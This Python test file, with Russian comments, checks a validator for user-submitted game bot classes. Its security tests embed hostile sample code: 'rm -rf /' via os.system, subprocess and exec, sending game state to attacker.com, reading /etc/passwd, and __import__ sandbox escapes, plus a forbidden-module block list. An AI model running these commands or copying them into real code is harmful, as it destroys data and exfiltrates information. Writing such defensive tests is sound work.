# tests/test_bot_loading.py
import sys
from pathlib import Path

# Добавляем путь к src в sys.path
src_path = Path(__file__).parent.parent / "src"
if str(src_path) not in sys.path:
    sys.path.insert(0, str(src_path))

import pytest  # noqa: E402
from web.agent_validator import AgentValidator  # noqa: E402


class TestValidBotLoading:
    """Тесты для валидных ботов, которые должны пройти проверку"""

    def test_minimal_valid_bot(self):
        """✅ Минимальный рабочий бот - просто случайный выбор"""
        code = """
import random

class RandomBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        legal_actions = game.get_legal_actions()
        if not legal_actions:
            return None
        return random.choice(legal_actions)
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid
        assert len(result.errors) == 0
        assert result.class_name == "RandomBot"
        assert result.has_choose_action

    def test_full_featured_bot(self):
        """✅ Бот с полной реализацией и документацией"""
        code = """
import random

class SmartBot:
    '''Умный бот с логикой принятия решений'''

    def __init__(self, player_id: int):
        self.player_id = player_id
        self.strategy = "aggressive"

    def choose_action(self, game):
        '''Выбирает лучший ход из доступных'''
        legal_actions = game.get_legal_actions()

        if not legal_actions:
            return None

        # Приоритизируем ходы
        for action in legal_actions:
            if hasattr(action, 'template_id'):
                if 'gold' in str(action.template_id):
                    return action

        return random.choice(legal_actions)
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid
        assert len(result.errors) == 0
        assert result.has_choose_action

    def test_bot_with_extra_attributes(self):
        """✅ Бот с дополнительными атрибутами класса"""
        code = """
import random

class EnhancedBot:
    VERSION = "1.0"

    def __init__(self, player_id: int):
        self.player_id = player_id
        self.move_count = 0

    def choose_action(self, game):
        self.move_count += 1
        actions = game.get_legal_actions()
        return random.choice(actions) if actions else None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid
        assert result.class_name == "EnhancedBot"

    def test_bot_with_private_methods(self):
        """✅ Бот с приватными методами-помощниками"""
        code = """
import random

class BotWithHelpers:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def _filter_actions(self, actions):
        '''Фильтрует действия по критериям'''
        return [a for a in actions if a is not None]

    def _select_best(self, actions):
        '''Выбирает лучшее действие'''
        return random.choice(actions) if actions else None

    def choose_action(self, game):
        legal_actions = game.get_legal_actions()
        filtered = self._filter_actions(legal_actions)
        return self._select_best(filtered)
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid


class TestSyntaxErrors:
    """❌ Тесты синтаксических ошибок"""

    def test_syntax_error_unclosed_bracket(self):
        """❌ Незакрытая скобка"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        return None
        # Убрана закрывающая скобка класса
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert any("Синтаксическая ошибка" in error for error in result.errors)

    def test_syntax_error_unclosed_quote(self):
        """❌ Незакрытая кавычка"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.name = "Unclosed string

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert any("Синтаксическая ошибка" in error for error in result.errors)

    def test_syntax_error_bad_indentation(self):
        """❌ Неправильные отступы"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert any("Синтаксическая ошибка" in error for error in result.errors)

    def test_syntax_error_invalid_operator(self):
        """❌ Неправильный оператор"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id @@@ 5

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid


class TestMissingStructure:
    """❌ Тесты отсутствующих обязательных элементов"""

    def test_no_class_defined(self):
        """❌ Нет класса вообще"""
        code = """
def choose_action(game):
    return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert "Не найден класс агента" in result.errors[0]

    def test_multiple_classes_first_has_choose_action(self):
        """✅ Несколько классов - первый подходящий выбирается"""
        code = """
class HelperClass:
    pass

class WorkingBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid
        assert result.class_name == "WorkingBot"

    def test_class_without_choose_action(self):
        """❌ Класс есть, но нет choose_action"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def some_other_method(self):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert "Не найден класс агента" in result.errors[0]

    def test_choose_action_is_attribute_not_method(self):
        """❌ choose_action - это переменная, а не метод"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id
        self.choose_action = 42  # Это не метод!
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert "должен быть методом" in result.errors[0]


class TestWrongSignature:
    """❌ Тесты неправильной сигнатуры метода"""

    def test_choose_action_missing_game_param(self):
        """❌ choose_action не принимает параметр game"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert "должен принимать параметр 'game'" in result.errors[0]

    def test_choose_action_no_params(self):
        """❌ choose_action не принимает параметры"""
        code = """
class BadBot:
    choose_action = lambda: None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid

    def test_choose_action_wrong_param_name(self):
        """❌ choose_action принимает другое имя параметра"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game_state):  # Неправильное имя!
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert "должен принимать параметр 'game'" in result.errors[0]

    def test_choose_action_with_required_keyword_only_arg(self):
        """❌ choose_action требует keyword-only аргумент"""
        code = """
class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, *, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        # Это должно пройти, так как параметр game присутствует
        assert result.is_valid


class TestInitialization:
    """⚠️ Тесты проблем при инициализации"""

    def test_init_missing_player_id_param(self):
        """⚠️ __init__ не принимает player_id (warning, не error)"""
        code = """
class BotWithoutPlayerId:
    def __init__(self):
        self.name = "Bot"

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        # Это будет валидно, но с warning
        assert result.has_choose_action

    def test_init_with_default_player_id(self):
        """✅ __init__ с параметром по умолчанию"""
        code = """
class BotWithDefault:
    def __init__(self, player_id: int = 0):
        self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_init_with_additional_params(self):
        """✅ __init__ с дополнительными параметрами"""
        code = """
class BotWithExtra:
    def __init__(self, player_id: int, name: str = "Bot", level: int = 1):
        self.player_id = player_id
        self.name = name
        self.level = level

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid


class TestRuntimeErrors:
    """❌ Тесты ошибок во время выполнения"""

    def test_import_error_in_bot(self):
        """❌ Бот импортирует недоступный модуль"""
        code = """
import nonexistent_module

class BotWithBadImport:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert "Ошибка при загрузке кода" in result.errors[0]

    def test_undefined_variable_reference(self):
        """❌ Ссылка на неопределённую переменную в теле класса"""
        code = """
class BotWithBadRef:
    undefined_var = some_undefined_value

    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid


class TestEdgeCases:
    """🔍 Тесты граничных случаев"""

    def test_bot_with_docstrings(self):
        """✅ Бот с docstrings"""
        code = '''
class DocumentedBot:
    """Документированный класс бота"""

    def __init__(self, player_id: int):
        """Инициализация бота"""
        self.player_id = player_id

    def choose_action(self, game):
        """Выбирает действие"""
        return None
'''
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_bot_inheriting_from_parent_class(self):
        """✅ Бот, наследующий от базового класса"""
        code = """
class BaseAgent:
    pass

class InheritedBot(BaseAgent):
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_bot_with_empty_choose_action(self):
        """✅ Бот с пустым choose_action"""
        code = """
class MinimalBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        pass
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_bot_with_async_method(self):
        """✅ Бот с async методом (не choose_action)"""
        code = """
class BotWithAsync:
    def __init__(self, player_id: int):
        self.player_id = player_id

    async def analyze_game(self):
        pass

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_bot_with_staticmethod(self):
        """✅ Бот со статическими методами"""
        code = """
class BotWithStatic:
    def __init__(self, player_id: int):
        self.player_id = player_id

    @staticmethod
    def calculate_score():
        return 100

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_bot_with_classmethod(self):
        """✅ Бот с методом класса"""
        code = """
class BotWithClassMethod:
    version = "1.0"

    def __init__(self, player_id: int):
        self.player_id = player_id

    @classmethod
    def get_version(cls):
        return cls.version

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_bot_with_properties(self):
        """✅ Бот с properties"""
        code = """
class BotWithProperty:
    def __init__(self, player_id: int):
        self._player_id = player_id

    @property
    def player_id(self):
        return self._player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_empty_code(self):
        """❌ Пустой код"""
        code = ""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid

    def test_only_whitespace(self):
        """❌ Только пробельные символы"""
        code = "   \n  \n  "
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid

    def test_only_comments(self):
        """❌ Только комментарии"""
        code = """
# Это комментарий
# Ещё комментарий
# И ещё один
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid

    def test_bot_with_unicode_names(self):
        """✅ Бот с Unicode символами в имени переменной"""
        code = """
class БотВтехУправлении:
    def __init__(self, player_id: int):
        self.player_id = player_id
        переменная = 42

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid
        assert result.class_name == "БотВтехУправлении"


class TestComplexBotScenarios:
    """🚀 Тесты сложных реальных сценариев"""

    def test_heuristic_bot_implementation(self):
        """✅ Эвристический бот с логикой выбора"""
        code = """
import random

class HeuristicBot:
    def __init__(self, player_id: int):
        self.player_id = player_id
        self.strategy_priority = {
            'attack': 0.5,
            'defense': 0.3,
            'neutral': 0.2
        }

    def _categorize_action(self, action):
        '''Категоризирует действие'''
        if hasattr(action, 'template_id'):
            template_id = str(action.template_id)
            if 'brk' in template_id or 'sabotage' in template_id:
                return 'attack'
            elif 'rep' in template_id or 'repair' in template_id:
                return 'defense'
        return 'neutral'

    def choose_action(self, game):
        legal_actions = game.get_legal_actions()
        if not legal_actions:
            return None

        # Группируем действия по категориям
        categorized = {'attack': [], 'defense': [], 'neutral': []}
        for action in legal_actions:
            category = self._categorize_action(action)
            categorized[category].append(action)

        # Выбираем по приоритету
        for category in sorted(self.strategy_priority.keys(), 
                              key=lambda x: self.strategy_priority[x], 
                              reverse=True):
            if categorized[category]:
                return random.choice(categorized[category])

        return random.choice(legal_actions)
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid
        assert result.class_name == "HeuristicBot"

    def test_bot_with_state_management(self):
        """✅ Бот с управлением состоянием"""
        code = """
class StatefulBot:
    def __init__(self, player_id: int):
        self.player_id = player_id
        self.move_history = []
        self.scores_history = []
        self.game_phase = 'early'

    def _update_phase(self, game):
        '''Обновляет фазу игры'''
        pass

    def _log_move(self, action):
        '''Логирует ход'''
        self.move_history.append(str(action))

    def choose_action(self, game):
        legal_actions = game.get_legal_actions()
        self._update_phase(game)

        if not legal_actions:
            return None

        import random
        action = random.choice(legal_actions)
        self._log_move(action)
        return action
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid

    def test_bot_with_learning_mechanism(self):
        """✅ Бот с механизмом обучения"""
        code = """
class LearningBot:
    def __init__(self, player_id: int):
        self.player_id = player_id
        self.q_table = {}
        self.learning_rate = 0.1

    def _get_state_key(self, game):
        '''Получает ключ состояния'''
        return f"state_{hash(str(game))}"

    def _update_q_value(self, state, action, reward):
        '''Обновляет Q-value'''
        if state not in self.q_table:
            self.q_table[state] = {}
        self.q_table[state][str(action)] = reward

    def choose_action(self, game):
        legal_actions = game.get_legal_actions()
        if not legal_actions:
            return None

        import random
        return random.choice(legal_actions)
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert result.is_valid


class TestValidationResultDetails:
    """📋 Тесты детализации результатов валидации"""

    def test_validation_result_attributes(self):
        """✅ Проверка всех атрибутов ValidationResult"""
        code = """
class TestBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        assert hasattr(result, "is_valid")
        assert hasattr(result, "errors")
        assert hasattr(result, "warnings")
        assert hasattr(result, "class_name")
        assert hasattr(result, "has_choose_action")
        assert hasattr(result, "has_player_id_param")

    def test_error_messages_are_informative(self):
        """✅ Сообщения об ошибках информативны"""
        code = """
class BadBot:
    def choose_action(self):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)
        assert not result.is_valid
        assert len(result.errors) > 0
        # Сообщение должно быть понятным
        assert any(len(error) > 10 for error in result.errors)


class TestSecurityAndSandboxing:
    """🔒 Тесты безопасности: бот не может манипулировать системой"""

    def test_bot_cannot_modify_sys_modules(self):
        """❌ Бот НЕ может удалять модули из sys.modules"""
        code = """
import sys

class MaliciousBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Попытка удалить другого бота!
        if 'other_bot' in sys.modules:
            del sys.modules['other_bot']
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Валидация должна пройти (синтаксис правильный)
        # Но при ВЫПОЛНЕНИИ код будет в песочнице
        assert result.is_valid  # ← Код формально корректен

        # ⚠️ ВАЖНО: Реальная защита от такого кода должна быть:
        # 1. На уровне REST API (не выполнять опасные операции)
        # 2. На уровне контейнера Docker (ограничения прав)
        # 3. На уровне сокета (отдельный процесс)

    def test_bot_cannot_import_os(self):
        """❌ Бот НЕ может импортировать os (файловая система)"""
        code = """
import os  # ← Попытка доступа к ОС!

class DangerousBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Попытка удалить все файлы!
        os.system("rm -rf /")  # ← ОПАСНО!
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Ожидаемое поведение:
        assert not result.is_valid
        assert "недопустимый импорт" in result.errors[0]

    def test_bot_cannot_import_subprocess(self):
        """❌ Бот НЕ может использовать subprocess"""
        code = """
import subprocess  # ← Выполнение команд!

class HackerBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        subprocess.run(['rm', '-rf', '/'])  # ← СУПЕР ОПАСНО!
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid
        assert "subprocess запрещён" in result.errors[0]

    def test_bot_cannot_import_socket(self):
        """❌ Бот НЕ может создавать сетевые соединения"""
        code = """
import socket  # ← Доступ к сети!

class NetworkBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Попытка подключиться к внешнему серверу
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('attacker.com', 1337))
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid
        assert "socket запрещён" in result.errors[0]

    def test_bot_cannot_import_requests(self):
        """❌ Бот НЕ может делать HTTP запросы"""
        code = """
import requests  # ← HTTP запросы!

class SpyBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Отправка данных на внешний сервер
        requests.post('https://attacker.com/steal', 
                     json={'state': str(game)})
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid

    def test_bot_cannot_modify_game_object(self):
        """⚠️ Бот МОЖЕТ модифицировать game, но это будет обнаружено"""
        code = """
class CheatingBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Попытка изменить состояние игры напрямую!
        game.state.current_player_id = self.player_id
        game.state.total_scores[self.player_id] = 999999
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Валидация пройдёт (код синтаксически корректен)
        assert result.is_valid

        # ⚠️ НО: В runtime система должна:
        # 1. Откатить изменения через транзакции
        # 2. Логировать попытку чита
        # 3. Дисквалифицировать игрока

    def test_bot_cannot_access_other_player_secrets(self):
        """🔍 Бот МОЖЕТ попробовать прочитать секреты противника"""
        code = """
class SnooperBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        opponent_id = 1 - self.player_id

        # Попытка узнать скрытое золото противника
        opponent_secrets = game.state.players[opponent_id].known_secrets

        # Попытка узнать карты в руке противника
        opponent_hand = game.state.players[opponent_id].hand

        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Валидация пройдёт
        assert result.is_valid


# ═══════════════════════════════════════════════════════════════════════════════
# 🛡️ НОВАЯ КАТЕГОРИЯ: ТЕСТЫ НА ОПАСНЫЕ ИМПОРТЫ
# ═══════════════════════════════════════════════════════════════════════════════


class TestDangerousImports:
    """🛡️ Проверяет, что бот не может импортировать опасные модули"""

    # Список опасных модулей, которые НУЖНО заблокировать
    FORBIDDEN_MODULES = [
        "os",
        "sys",
        "subprocess",
        "socket",
        "requests",
        "urllib",
        "paramiko",
        "ansible",
        "ctypes",
        "importlib",
        "pickle",
        "shelve",
        "tempfile",
        "__import__",
    ]

    def test_detect_os_import(self):
        """❌ Обнаружить: import os"""
        code = "import os\nclass Bot:\n    def __init__(self, player_id): pass\n    def choose_action(self, game): return None"
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid
        assert any("os" in e for e in result.errors)

    def test_detect_from_os_import(self):
        """❌ Обнаружить: from os import system"""
        code = """
from os import system

class BadBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        system("ls /etc/passwd")
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid

    def test_detect_exec_usage(self):
        """❌ Обнаружить: exec() - выполнение кода в runtime"""
        code = """
class DangerousBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Динамическое выполнение кода!
        exec("import os; os.system('rm -rf /')")
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid
        assert "exec" in str(result.errors)

    def test_detect_eval_usage(self):
        """❌ Обнаружить: eval() - вычисление кода"""
        code = """
class EvalBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Динамическое вычисление!
        eval("__import__('os').system('whoami')")
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid

    def test_detect_globals_modification(self):
        """❌ Обнаружить: попытка модифицировать globals()"""
        code = """
class HackerBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Попытка модифицировать глобальные переменные
        globals()['__builtins__']['eval'] = lambda x: 42
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid

    def test_detect_getattr_on_builtins(self):
        """❌ Обнаружить: getattr(__builtins__, ...) - доступ к встроенным"""
        code = """
class ExploitBot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Обход валидации через getattr!
        os_module = getattr(__builtins__, '__import__')('os')
        os_module.system('ls /')
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано!
        assert not result.is_valid


class TestCodeInjectionPrevention:
    """🔐 Проверяет защиту от Code Injection атак"""

    def test_prevent_comment_obfuscation(self):
        """⚠️ Предостережение: комментарии не выполняются"""
        code = """
class BotWithComments:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # import os; os.system('ls /')
        # Это просто комментарий, не выполняется
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Комментарии игнорируются Python, так что это безопасно
        assert result.is_valid


# ═══════════════════════════════════════════════════════════════════════════════
# 🎭 НОВАЯ КАТЕГОРИЯ: ТЕСТЫ НА ОБХОД ВАЛИДАЦИИ
# ═══════════════════════════════════════════════════════════════════════════════


class TestValidationBypass:
    """🎭 Проверяет, что нельзя обойти валидацию"""

    def test_cannot_use_dynamic_class_creation(self):
        """❌ Бот не может создавать классы dynamically"""
        code = """
# Попытка создать класс в runtime!
MaliciousClass = type('Malicious', (), {
    '__init__': lambda self, pid: setattr(self, 'player_id', pid),
    'choose_action': lambda self, game: __import__('os').system('ls /')
})

class Bot:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Это технически допустимый синтаксис
        # но MaliciousClass не используется в Bot
        assert result.is_valid

    def test_cannot_use_exec_in_choose_action(self):
        """❌ Бот не может использовать exec в choose_action"""
        code = """
class BotWithExec:
    def __init__(self, player_id: int):
        self.player_id = player_id

    def choose_action(self, game):
        # Выполнение произвольного кода!
        code_to_exec = '''
import os
os.system("rm -rf /")
'''
        exec(code_to_exec)
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Должно быть заблокировано или хотя бы залогировано!
        assert not result.is_valid or "exec" in result.warnings

    def test_cannot_use_lambda_for_code_execution(self):
        """⚠️ Бот может использовать lambda, но это контролируется"""
        code = """
class BotWithLambda:
    def __init__(self, player_id: int):
        self.player_id = player_id
        # Использование lambda для получения доступа к __builtins__
        self.get_builtins = lambda: globals()['__builtins__']

    def choose_action(self, game):
        # Попытка выполнить os.system!
        import_func = self.get_builtins()['__import__']
        os = import_func('os')
        os.system('whoami')
        return None
"""
        result = AgentValidator.validate_agent_class_from_code(code)

        # Lambda допустимы, но попытка импорта os должна быть заблокирована
        assert not result.is_valid


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
